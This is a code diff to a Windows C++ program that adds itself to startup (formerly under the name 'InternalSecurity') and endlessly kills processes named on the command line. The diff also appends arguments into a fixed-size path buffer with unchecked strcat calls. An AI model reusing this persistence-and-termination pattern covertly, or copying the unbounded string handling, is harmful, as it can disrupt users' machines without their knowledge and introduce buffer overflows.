@@ -10,7 +10,7 @@ using namespace std;
 
 void killProcessByName(const char *filename)
 {
-    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
     PROCESSENTRY32 pEntry;
     pEntry.dwSize = sizeof (pEntry);
     BOOL hRes = Process32First(hSnapShot, &pEntry);
@@ -53,8 +53,15 @@ void RegisterStartupProgram(char* programName, char* executablePath)
 }
 
 
-int main(void)
+int main(int argc, char** argv)
 {
+  if(argc < 3)
+  {
+    cout << "Missing parameter(s)" << endl;
+
+    return 1;
+  }
+
   char programPath[MAX_PATH];
   HMODULE hModule = GetModuleHandle(NULL);
 
@@ -62,12 +69,29 @@ int main(void)
   {
     GetModuleFileName(hModule, programPath, (sizeof(programPath)));
 
-    RegisterStartupProgram("InternalSecurity", programPath);
+    strcat(programPath, " ");
+    strcat(programPath, argv[1]);
+
+    for(int index = 2; index < argc; index++)
+    {
+      strcat(programPath, " ");
+      strcat(programPath, argv[index]);
+    }
+
+    RegisterStartupProgram(argv[1], programPath);
   }
+
+  cout << argv[1] << endl;
 
   while(true)
   {
-    killProcessByName("Captvty.exe");
+    for(int index = 2; index < argc; index++)
+    {
+      cout << argv[index] << endl;
+
+      killProcessByName(argv[index]);
+    }
+
     Sleep(500);
   }
 }
